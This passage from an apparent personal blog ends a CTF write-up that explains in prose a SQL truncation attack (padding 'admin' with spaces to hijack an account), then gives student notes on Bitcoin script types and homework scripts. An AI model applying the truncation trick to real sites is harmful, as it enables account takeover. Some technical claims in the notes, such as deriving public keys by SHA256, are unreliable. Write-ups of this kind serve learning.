<p>    主要原理就是<code>insert</code>时候有<code>varchar(n)</code>的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将<code>admin+[大量空格]</code>删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入<code>admin+[空格]（截取）</code>和自定义密码了。</p>
<p>    如果使用用户名<code>“vampire”</code>和密码“<code>random_pass</code>”登录的话，对比时是<code>admin</code>与<code>admin+[大量空格]</code>，会将前面的<code>admin</code>添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?</p>
<p>    当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的<code>return $username</code>，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。</p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链学习</title>
    <url>/2020/11/11/20201111/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><hr>
<p>这篇博客主要总结一下区块链学习中的一些有趣的东西。</p>
<h1 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h1><hr>
<p>按照老师的要求以及助教给的一些问题的解决方案。把python从3.8装回3.7再装回3.6，好像都没什么用。在pycharm运行代码总是说缺少依赖，然而明明已经装过了，点击它给的解决方案安装依赖，然后安装失败。于是我灵机一动，把之前装过的都卸掉了，再点那个安装，还是失败，于是我打开里面的虚拟终端通过命令行来安装。终于不提示缺少依赖。然而运行的时候，提示我的python-bitcoinlib库有问题，点进去查看源码依然毫无头绪。然后打开了虚拟机里的Ubuntu，安装依赖后可以跑代码。于是我的环境终于有了。</p>
<h1 id="领取测试币"><a href="#领取测试币" class="headerlink" title="领取测试币"></a>领取测试币</h1><hr>
<p> 进到<a href="https://coinfaucet.eu/en/btctestnet/">比特币测试网络</a>领取比特币，在找完公交车或者自行车以及斑马线之后总是卡住不同，于是挂vpn再访问终于施舍给了我点币子。</p>
<h1 id="比特币脚本（暂时了解的）"><a href="#比特币脚本（暂时了解的）" class="headerlink" title="比特币脚本（暂时了解的）"></a>比特币脚本（暂时了解的）</h1><hr>
<p>比特币脚本语言是一种基于栈的脚本语言（每个命令只执行一次），不是图灵完备的。比特币脚本包含两个部分，解锁脚本+锁定脚本，连在一起才是完整的，运行正确之后在栈中返回一个Ture。</p>
<h2 id="公钥支付-P2PK-（Pay-to-Publish-Key）"><a href="#公钥支付-P2PK-（Pay-to-Publish-Key）" class="headerlink" title="公钥支付 P2PK （Pay to Publish Key）"></a>公钥支付 P2PK （Pay to Publish Key）</h2><p>锁定脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;pubkey&gt;         #公钥</span><br><span class="line">OP_CKECKSIG      #验证签名的脚本语言</span><br></pre></td></tr></table></figure>
<p>解锁脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Sig&gt;            #签名</span><br></pre></td></tr></table></figure>
<p><code>OP_CKECKSIG</code>的部分函数定义，大致看起来就是利用<code>pubkey</code>生成一个数字签名，再与输入的签名比较，最后如果是<code>ok</code>就会在栈里留下一个<code>Ture</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def _CheckSig(sig, pubkey, script, txTo, inIdx, err_raiser):</span><br><span class="line">    key &#x3D; bitcoin.core.key.CECKey()</span><br><span class="line">    key.set_pubkey(pubkey)</span><br><span class="line"></span><br><span class="line">    if len(sig) &#x3D;&#x3D; 0:</span><br><span class="line">        return False</span><br><span class="line">    hashtype &#x3D; _bord(sig[-1])</span><br><span class="line">    sig &#x3D; sig[:-1]</span><br><span class="line">    (h, err) &#x3D; RawSignatureHash(script, txTo, inIdx, hashtype)</span><br><span class="line">    return key.verify(h, sig)</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">elif sop &#x3D;&#x3D; OP_CHECKSIG or sop &#x3D;&#x3D; OP_CHECKSIGVERIFY:</span><br><span class="line">                check_args(2)</span><br><span class="line">                vchPubKey &#x3D; stack[-1]</span><br><span class="line">                vchSig &#x3D; stack[-2]</span><br><span class="line">                tmpScript &#x3D; CScript(scriptIn[pbegincodehash:])</span><br><span class="line">                tmpScript &#x3D; FindAndDelete(tmpScript, CScript([vchSig]))</span><br><span class="line"></span><br><span class="line">                ok &#x3D; _CheckSig(vchSig, vchPubKey, tmpScript, txTo, inIdx,</span><br><span class="line">                               err_raiser)</span><br><span class="line">                if not ok and sop &#x3D;&#x3D; OP_CHECKSIGVERIFY:</span><br><span class="line">                    err_raiser(VerifyOpFailedError, sop)</span><br><span class="line"></span><br><span class="line">                else:</span><br><span class="line">                    stack.pop()</span><br><span class="line">                    stack.pop()</span><br><span class="line"></span><br><span class="line">                    if ok:</span><br><span class="line">                        if sop !&#x3D; OP_CHECKSIGVERIFY:</span><br><span class="line">                            stack.append(b&quot;\x01&quot;)</span><br><span class="line">                    else:</span><br><span class="line">                        # FIXME: this is incorrect, but not caught by existing</span><br><span class="line">                        # test cases</span><br><span class="line">                        stack.append(b&quot;\x00&quot;)</span><br></pre></td></tr></table></figure>
<p>完整的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Sig&gt;</span><br><span class="line">----------</span><br><span class="line">&lt;pubkey&gt;         </span><br><span class="line">OP_CKECKSIG </span><br></pre></td></tr></table></figure>
<p>执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL|初始状态，栈为空</span><br><span class="line">&lt;Sig&gt;|&lt;Sig&gt;压栈</span><br><span class="line">&lt;Sig&gt;&lt;pubkey&gt;|&lt;pubkey&gt;压栈</span><br><span class="line">Ture|执行OP_CHECKSIG,成功会把前两个东西pop掉，压入一个Ture</span><br></pre></td></tr></table></figure>
<h2 id="P2PKH（Pay-To-Public-Key-Hash）"><a href="#P2PKH（Pay-To-Public-Key-Hash）" class="headerlink" title="P2PKH（Pay To Public Key Hash）"></a>P2PKH（Pay To Public Key Hash）</h2><p>刚开始不知道公钥哈希值是什么，原来就是我们的地址。私钥通过SHA256得到公钥，公钥经过RIPEMD160得到公钥哈希，公钥哈希经过Base58编码就是地址，某种意义上，地址就是公钥哈希</p>
<hr>
<p>锁定脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_DUP</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;address&gt;</span><br><span class="line">OP_EQUALVERIFY</span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure>
<p>解锁脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;sig&gt;</span><br><span class="line">&lt;pubkey&gt;</span><br></pre></td></tr></table></figure>
<p>完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;sig&gt;</span><br><span class="line">&lt;pubkey&gt;</span><br><span class="line">----------</span><br><span class="line">OP_DUP</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;address&gt;</span><br><span class="line">OP_EQUALVERIFY   #检验两个值是否相等，不会返回值，只会删去栈顶两个元素</span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure>
<p>执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL	| 初始状态栈为空</span><br><span class="line">&lt;sig&gt;	| sig压栈</span><br><span class="line">&lt;sig&gt;&lt;pubKey&gt;	| pubKey压栈</span><br><span class="line">&lt;sig&gt;&lt;pubKey&gt;&lt;pubKey&gt;	| OP_DUP复制栈顶元素并将其压栈</span><br><span class="line">&lt;sig&gt;&lt;pubKey&gt;&lt;pubKeyHash&gt;	| OP_HASH160计算公钥哈希值并用其替换栈顶</span><br><span class="line">&lt;sig&gt;&lt;pubKey&gt;&lt;pubKeyHash&gt;&lt;pubKeyHash?&gt;	| 已知的address压栈，即不知道</span><br><span class="line">&lt;sig&gt;&lt;pubKey&gt;	| 比较address和pubKeyHash，相等后抛弃栈顶开始的两位，不相等就终止</span><br><span class="line">true	| 用CHECKSIG验证签名有效，有效则true，无效则false</span><br></pre></td></tr></table></figure>
<h2 id="多重签名P2MS-Multiple-Signatures"><a href="#多重签名P2MS-Multiple-Signatures" class="headerlink" title="多重签名P2MS(Multiple Signatures)"></a>多重签名P2MS(Multiple Signatures)</h2><hr>
<p>对于一个M-N的交易（M是需要认证的人数，N是总人数，即只要N中M个人的签名），锁定脚本为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_M</span><br><span class="line">&lt;PublicKey 1&gt;</span><br><span class="line">&lt;PublicKey 2&gt; </span><br><span class="line">... </span><br><span class="line">&lt;PublicKey N&gt; </span><br><span class="line">OP_N </span><br><span class="line">OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>
<p>解锁脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0            # OP_CHECKMULTISIG的一个bug，下面会解释</span><br><span class="line">&lt;Sig1&gt;</span><br><span class="line">&lt;Sig2&gt;</span><br><span class="line">...</span><br><span class="line">&lt;SigM&gt;          # N个人中随意M个人的签名</span><br></pre></td></tr></table></figure>
<p>完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0            </span><br><span class="line">&lt;Sig1&gt;</span><br><span class="line">&lt;Sig2&gt;</span><br><span class="line">...</span><br><span class="line">&lt;SigM&gt;</span><br><span class="line">----------</span><br><span class="line">OP_M</span><br><span class="line">&lt;PublicKey 1&gt;</span><br><span class="line">&lt;PublicKey 2&gt; </span><br><span class="line">... </span><br><span class="line">&lt;PublicKey N&gt; </span><br><span class="line">OP_N </span><br><span class="line">OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>
<p>执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL |初始状态，栈为空</span><br><span class="line">0    |OP_0将0压栈</span><br><span class="line">0&lt;Sig1&gt;&lt;Sig2&gt;···&lt;SigM&gt;|M个签名入栈</span><br><span class="line">0&lt;Sig1&gt;&lt;Sig2&gt;···&lt;SigM&gt;M|OP_M把M压栈</span><br><span class="line">0&lt;Sig1&gt;&lt;Sig2&gt;···&lt;SigM&gt;M&lt;PublicKey 1&gt;&lt;PublicKey 2&gt;···&lt;PublicKey N&gt;  |N个PublicKey入栈</span><br><span class="line">True |OP_CHECKMULTISIG进行验证，成功则返回一个ture</span><br></pre></td></tr></table></figure>
<p>OP_0是OP_CHECKMULTISIG的一个bug，不过由于历史遗留问题，debug成本过高，所以就遗留下来了，没什么具体含义，可以当成一个小彩蛋。OP_CHECKMULTISIG所做的具体操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">弹出一个N，得到公钥数量</span><br><span class="line">弹出N个公钥的值</span><br><span class="line">弹出一个M，得到签名数量</span><br><span class="line">弹出M个签名</span><br><span class="line">得到了所有数据，计算脚本是否有效</span><br></pre></td></tr></table></figure>
<p>在弹出M个签名之后，会再pop一次，如果没有OP_0，存在，这时候栈已经空了，pop会出错，脚本没法运行，OP_0就是为了这个bug而生的，弹出的OP_0不会对脚本运行结果产生影响，只是让它能够运行，所以压入什么数应该都可以</p>
<h2 id="脚本哈希支付P2SH（Pay-to-Script-Hash）"><a href="#脚本哈希支付P2SH（Pay-to-Script-Hash）" class="headerlink" title="脚本哈希支付P2SH（Pay to Script Hash）"></a>脚本哈希支付P2SH（Pay to Script Hash）</h2><p>一开始以为这个和Multiple Signatures是一样的东西，后来看了很多博客才知道是可以通过这种方法实现P2MS,P2SH是2012年提出的，个人理解这个脚本是为了防止Script过于长而导致交易失败，通过HASH160得到脚本的哈希值，这样就能解决长度问题</p>
<hr>
<p>P2SH中的脚本包括三部分，赎回脚本(redeem Script)、锁定脚本（locking Script）、解锁脚本（unlocking Script）</p>
<hr>
<p>赎回脚本(redeem Script)类似于之前脚本里的锁定脚本（locking Script）内容是一致的<br>锁定脚本（locking Script）形式是固定的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_HASH160</span><br><span class="line">&lt;redeem Script hash&gt;   #redeem Script的哈希</span><br><span class="line">OP_EQUAL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解锁脚本（unlocking Script）与赎回脚本相关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line">&lt;Sig&gt;</span><br><span class="line">···       #需要的签名以及其他内容</span><br><span class="line">&lt;serialized redeem Script&gt; #序列化的赎回脚本，作为数据而不作为脚本语言压栈</span><br></pre></td></tr></table></figure>
<p>脚本的执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先就是解锁的脚本压栈</span><br><span class="line">此时栈顶就是&lt;serialized redeem Script&gt;</span><br><span class="line">然后锁定脚本依次压栈</span><br><span class="line">先得到赎回栈顶的哈希值</span><br><span class="line">再与锁定脚本中的哈希值对比两者不匹配验证就失败</span><br><span class="line">成功则序列化脚本会被反序列化再与栈内的剩余内容（也就是解锁脚本中剩下的所有&lt;Sig&gt;或者其他内容）构成完整的脚本</span><br></pre></td></tr></table></figure>

<p>下面以实现P2PKH与P2MS两种脚本为例写两个P2SH脚本</p>
<hr>
<h3 id="P2PKH"><a href="#P2PKH" class="headerlink" title="P2PKH"></a>P2PKH</h3><p>赎回脚本(redeem Script)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_DUP</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;address&gt;</span><br><span class="line">OP_EQUALVERIFY</span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure>
<p>锁定脚本（locking Script）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_HASH160</span><br><span class="line">&lt;redeem Script hash&gt;   #redeem Script的哈希</span><br><span class="line">OP_EQUAL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解锁脚本(unlocking Script)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Sig&gt;</span><br><span class="line">&lt;Pubkey&gt;</span><br><span class="line">&lt;serialized redeem Script&gt;</span><br></pre></td></tr></table></figure>
<p>完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Sig&gt;</span><br><span class="line">&lt;Pubkey&gt;</span><br><span class="line">&lt;serialized redeem Script&gt;</span><br><span class="line">----------</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;redeem Script hash&gt;   </span><br><span class="line">OP_EQUAL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="P2MS"><a href="#P2MS" class="headerlink" title="P2MS"></a>P2MS</h3><p>赎回脚本(redeem Script)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_M</span><br><span class="line">&lt;PublicKey 1&gt;</span><br><span class="line">&lt;PublicKey 2&gt; </span><br><span class="line">... </span><br><span class="line">&lt;PublicKey N&gt; </span><br><span class="line">OP_N </span><br><span class="line">OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>
<p>锁定脚本（locking Script）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_HASH160</span><br><span class="line">&lt;redeem Script hash&gt;   #redeem Script的哈希</span><br><span class="line">OP_EQUAL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解锁脚本(unlocking Script)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0            </span><br><span class="line">&lt;Sig1&gt;</span><br><span class="line">&lt;Sig2&gt;</span><br><span class="line">...</span><br><span class="line">&lt;SigM&gt;          # N个人中随意M个人的签名</span><br><span class="line">&lt;serialized redeem Script&gt;</span><br></pre></td></tr></table></figure>
<p>完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0            </span><br><span class="line">&lt;Sig1&gt;</span><br><span class="line">&lt;Sig2&gt;</span><br><span class="line">...</span><br><span class="line">&lt;SigM&gt;          </span><br><span class="line">&lt;serialized redeem Script&gt;</span><br><span class="line">----------</span><br><span class="line">OP_HASH160</span><br><span class="line">&lt;redeem Script hash&gt;  </span><br><span class="line">OP_EQUAL</span><br></pre></td></tr></table></figure>
<h2 id="作业中的unknown脚本（P2PK-P2MS）"><a href="#作业中的unknown脚本（P2PK-P2MS）" class="headerlink" title="作业中的unknown脚本（P2PK+P2MS）"></a>作业中的unknown脚本（P2PK+P2MS）</h2><h3 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h3><ul>
<li>生成一个涉及四方的多签名交易，这样交易可以由第一方（银行）与另外三方（客户）中的任何一方（客户）共同赎回，而不仅仅只是客户或银行。对于这个问题，你可以假设是银行的角色，这样银行的私钥就是你的私钥，而银行的公钥就是你的公钥。使用keygen.py生成客户密钥并将它们粘贴到ex2a.py中。</li>
<li>赎回事务并确保scriptPubKey尽可能小。可以使用任何合法的签名组合来赎回交易，但要确保所有组合都有效</li>
</ul>
<hr>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>该交易中一共有四位参与者，银行与三位客户，需要银行与其他任何一个用户的签名才能赎回交易，如果只用多重签名，那么不需要银行的签名也能赎回，所以我们要把实验分两步，一步是验证银行签名，另外一步是验证客户签名。所以可以用P2PK+P2MS构成的脚本</p>
<h3 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h3><p>其实上述两个步骤没有先后顺序，银行和客户身份先验证后验证都无所谓，反正逃不过验证，只不过用的脚本会不一样</p>
<h4 id="先银行后客户"><a href="#先银行后客户" class="headerlink" title="先银行后客户"></a>先银行后客户</h4><p>锁定脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;pubkey bank&gt;     #银行公钥</span><br><span class="line">OP_CHECKSIGVERIFY #使用OP_CHECKSIGVERIFY而不用OP_CHECKSIG是因为它不会有在栈里压数剧，后面脚本执行不会出错</span><br><span class="line">OP_1</span><br><span class="line">&lt;pubkey 1&gt;</span><br><span class="line">&lt;pubkey 2&gt;</span><br><span class="line">&lt;pubkey 3&gt;        #三个客户的公钥</span><br><span class="line">OP_3</span><br><span class="line">OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>
<p>解锁脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0             </span><br><span class="line">&lt;sig cust&gt;</span><br><span class="line">&lt;sig bank&gt;       #注意顺序，因为先验证银行，所以银行的pubkey要在栈顶</span><br></pre></td></tr></table></figure>
<p>完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0</span><br><span class="line">&lt;sig cust&gt;</span><br><span class="line">&lt;sig bank&gt; </span><br><span class="line">----------</span><br><span class="line">&lt;pubkey bank&gt;     </span><br><span class="line">OP_CHECKSIGVERIFY</span><br><span class="line">OP_1</span><br><span class="line">&lt;pubkey 1&gt;</span><br><span class="line">&lt;pubkey 2&gt;</span><br><span class="line">&lt;pubkey 3&gt;        </span><br><span class="line">OP_3</span><br><span class="line">OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>
<p>执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL	| 起始状态</span><br><span class="line">0           | OP_0压栈</span><br><span class="line">0&lt;sig cust&gt;	| &lt;sig cust&gt;压栈</span><br><span class="line">0&lt;sig cust&gt;&lt;sig bank&gt;	| &lt;sig bank&gt;压栈</span><br><span class="line">0&lt;sig cust&gt;&lt;sig bank&gt;&lt;pubkey bank&gt;	| pubkey bank压栈</span><br><span class="line">0&lt;sig cust&gt;	| CHECKSIGVERIFY验证&lt;sig bank&gt;和&lt;pubkey bank&gt;是否匹配并将它们pop掉，匹配则继续，不匹配直接就验证不成功</span><br><span class="line">0&lt;sig cust&gt; 1	| OP_1压栈，确定需要检查的参数</span><br><span class="line">0&lt;sig cust&gt; 1 &lt;pubkey 1&gt;&lt;pubkey 2&gt;&lt;pubkey 3&gt;	| 3个pubkey压栈</span><br><span class="line">0&lt;sig cust&gt; 1 &lt;pubkey 1&gt;&lt;pubkey 2&gt;&lt;pubkey 3&gt; 3  | OP_3确定3个参数作为检查的范围</span><br><span class="line">true	| OP_CHECKMULTISIG检查多重签名，成功返回一个ture，否则验证失败</span><br></pre></td></tr></table></figure>
<h4 id="先客户后银行"><a href="#先客户后银行" class="headerlink" title="先客户后银行"></a>先客户后银行</h4><p>原理相同只给出完整脚本（注意脚本指令变了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;sig bank&gt; </span><br><span class="line">OP_0</span><br><span class="line">&lt;sig cust&gt;</span><br><span class="line">----------</span><br><span class="line">OP_1</span><br><span class="line">&lt;pubkey 1&gt;</span><br><span class="line">&lt;pubkey 2&gt;</span><br><span class="line">&lt;pubkey 3&gt;        </span><br><span class="line">OP_3</span><br><span class="line">OP_CHECKMULTISIGVERIFY</span><br><span class="line">&lt;pubkey bank&gt;     </span><br><span class="line">OP_CHECKSIG</span><br></pre></td></tr></table></figure>

<h1 id="自定义的脚本（解方程？？？）"><a href="#自定义的脚本（解方程？？？）" class="headerlink" title="自定义的脚本（解方程？？？）"></a>自定义的脚本（解方程？？？）</h1><h2 id="作业要求-1"><a href="#作业要求-1" class="headerlink" title="作业要求"></a>作业要求</h2><p>(a）生成可通过以下两个线性方程组的解x，y）赎回的交易:<br>x+y= (StudentID of First Half）和x-y= (StudentID of Second Half)<br>[为确保存在整数解，请更改右侧两个数字的最后一位，使数字都是偶数或都是奇数]。<br>(b）赎回交易。赎回脚本应尽可能小。也就是说，一个有效的<code>scriptSig</code>应该是简单地将两个整数x和y发送到堆栈中。确保在<code>scriptPubKey</code>中使用了<code>OP_ADD</code>和<code>OP_SUB</code>。</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>这个作业看起来就像是让你解个方程，然后验证一下你解的方乘对不对。（不过要是真的用这样脚本交易比特币那自己币子不是别人想用就随便用了嘛ORZ）<br>已经说了解锁脚本就是x和y，那么首先压入栈里的就是x和y，那接下就要验证x和y是不是方乘的解。<br>首先先把xy复制一遍，因为需要验证两个方程得用两边，就用到了<code>OP_2DUP</code>，它的定义是这样的，所以能把栈顶两个元素赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elif sop &#x3D;&#x3D; OP_2DUP:</span><br><span class="line">check_args(2)</span><br><span class="line">v1 &#x3D; stack[-2]</span><br><span class="line">v2 &#x3D; stack[-1]</span><br><span class="line">stack.append(v1)</span><br><span class="line">stack.append(v2)</span><br></pre></td></tr></table></figure>
<p>然后就把x和y加起来，用<code>OP_ADD</code>脚本，它在执行的时候会把x和y<code>pop</code>掉然后再把结果<code>push</code>进栈里<br>接着拿这个<code>result</code>和原方程里的值比较是否一致，这里之所以使用的是<code>OP_EQUALVERIFY</code>，是因为它不会产生一个返回值，而使用<code>OP_EQUAL</code>会在栈里留下一个ture值没法处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elif sop &#x3D;&#x3D; OP_EQUALVERIFY:</span><br><span class="line">                check_args(2)</span><br><span class="line">                v1 &#x3D; stack[-1]</span><br><span class="line">                v2 &#x3D; stack[-2]</span><br><span class="line"></span><br><span class="line">                if v1 &#x3D;&#x3D; v2:</span><br><span class="line">                    stack.pop()</span><br><span class="line">                    stack.pop()</span><br></pre></td></tr></table></figure>
<p>然后差不多和前面一样的思路，先得到一个减的结果，然后和方程里的值比较，用<code>OP_EQUAL</code>验证，在栈里留下一个true值,这里可以看到并不是直接返回一个false或者true，而是返回的<code>\x01</code>或者<code> </code>，应该是和true或者false一样的功能，为空是false，不为空是ture</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elif sop &#x3D;&#x3D; OP_EQUAL:</span><br><span class="line">                check_args(2)</span><br><span class="line">                v1 &#x3D; stack.pop()</span><br><span class="line">                v2 &#x3D; stack.pop()</span><br><span class="line"></span><br><span class="line">                if v1 &#x3D;&#x3D; v2:</span><br><span class="line">                    stack.append(b&quot;\x01&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    stack.append(b&quot;&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="实现脚本"><a href="#实现脚本" class="headerlink" title="实现脚本"></a>实现脚本</h2><h3 id="锁定脚本"><a href="#锁定脚本" class="headerlink" title="锁定脚本"></a>锁定脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_2DUP</span><br><span class="line">OP_ADD</span><br><span class="line">&lt;StudentID of First Half&gt;</span><br><span class="line">OP_EQUALVERIFY</span><br><span class="line">OP_SUB</span><br><span class="line">&lt;StudentID of Second Half&gt;</span><br><span class="line">OP_EQUAL</span><br></pre></td></tr></table></figure>
<h3 id="解锁脚本"><a href="#解锁脚本" class="headerlink" title="解锁脚本"></a>解锁脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;X&gt; #解方程的得到的xy值</span><br><span class="line">&lt;y&gt;</span><br></pre></td></tr></table></figure>
<h3 id="脚本运行过程"><a href="#脚本运行过程" class="headerlink" title="脚本运行过程"></a>脚本运行过程</h3><p>完整的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;X&gt; </span><br><span class="line">&lt;y&gt;</span><br><span class="line">-----</span><br><span class="line">OP_2DUP</span><br><span class="line">OP_ADD</span><br><span class="line">&lt;StudentID of First Half&gt;</span><br><span class="line">OP_EQUALVERIFY</span><br><span class="line">OP_SUB</span><br><span class="line">&lt;StudentID of Second Half&gt;</span><br><span class="line">OP_EQUAL</span><br></pre></td></tr></table></figure>
<p>运行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL    #起始状态，栈内为空</span><br><span class="line">&lt;x&gt;     #x压栈</span><br><span class="line">&lt;x&gt;&lt;y&gt;  #y压栈</span><br><span class="line">&lt;x&gt;&lt;y&gt;&lt;x&gt;&lt;y&gt; #OP_2DUP复制栈顶及栈顶下一个元素并压栈</span><br><span class="line">&lt;x&gt;&lt;y&gt;&lt;add_result&gt; #OP_ADD弹出xy并且将xy相加的结果压栈</span><br><span class="line">&lt;x&gt;&lt;y&gt;&lt;add_result&gt;&lt;stuid first&gt; #学号前四位压栈</span><br><span class="line">&lt;x&gt;&lt;y&gt;  #OP_EQUALVERIFY验证两个内容是否相等，相等则将其弹出</span><br><span class="line">&lt;sub_result&gt; #OP_SUB弹出xy并且将xy相减的结果压栈</span><br><span class="line">&lt;sub_result&gt;&lt;stuid second&gt; #学号后三位压栈</span><br><span class="line">ture    #OP_EQUAL验证栈内的两个数值是否相等然后将true压栈</span><br></pre></td></tr></table></figure>
<h2 id="掉进去的坑"><a href="#掉进去的坑" class="headerlink" title="掉进去的坑"></a>掉进去的坑</h2><p>没有用<code>OP_EQUALVERIFY</code>和<code>OP_EQUAL</code>用了<code>OP_NUMEQUALVERIFY</code>和<code>OP_NUMEQUAL</code><br>翻看python-bitcoinlib的源码，一开始只看到了<code>OP_NUMEQUALVERIFY</code>和<code>OP_NUMEQUAL</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elif opcode &#x3D;&#x3D; OP_NUMEQUAL:</span><br><span class="line">   bn &#x3D; long(bn1 &#x3D;&#x3D; bn2)</span><br><span class="line">   stack.pop()</span><br><span class="line">   stack.pop()</span><br><span class="line">   stack.append(bitcoin.core._bignum.bn2vch(bn))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elif opcode &#x3D;&#x3D; OP_NUMEQUALVERIFY:</span><br><span class="line">        bn &#x3D; long(bn1 &#x3D;&#x3D; bn2)</span><br><span class="line">        if not bn:</span><br><span class="line">            err_raiser(VerifyOpFailedError, opcode)</span><br><span class="line">        else:</span><br><span class="line">            # No exception, so time to pop the stack</span><br><span class="line">            stack.pop()</span><br><span class="line">            stack.pop()</span><br><span class="line">            return</span><br></pre></td></tr></table></figure>
<p>看似是没有什么大问题的，不过<code>OP_NUMEQUAL</code>里并没有直接把<code>bn</code>压栈，反而是调用了一个函数<code>bitcoin.core._bignum.bn2vch</code>，里面有<code>bignum</code>而且<code>bn</code>类型为<code>long</code>，调用的函数可能对bn做了处理导致最后没有办法得到ture之类的，那个函数也看了下定义之类的没有看得很清楚，因为函数里又调了别的函数。不过肯定是那个函数的锅。（浪费了我一份币子，还好当时分了十份）</p>
<h1 id="跨链原子交易"><a href="#跨链原子交易" class="headerlink" title="跨链原子交易"></a>跨链原子交易</h1><h2 id="实验介绍与要求"><a href="#实验介绍与要求" class="headerlink" title="实验介绍与要求"></a>实验介绍与要求</h2><h3 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h3><blockquote>
<p>在本次任务中，你需要创建一个称为跨链原子交换的交易，允许两个实体在不同的区块链上安全地交换加密货币的所有权。</p>
</blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
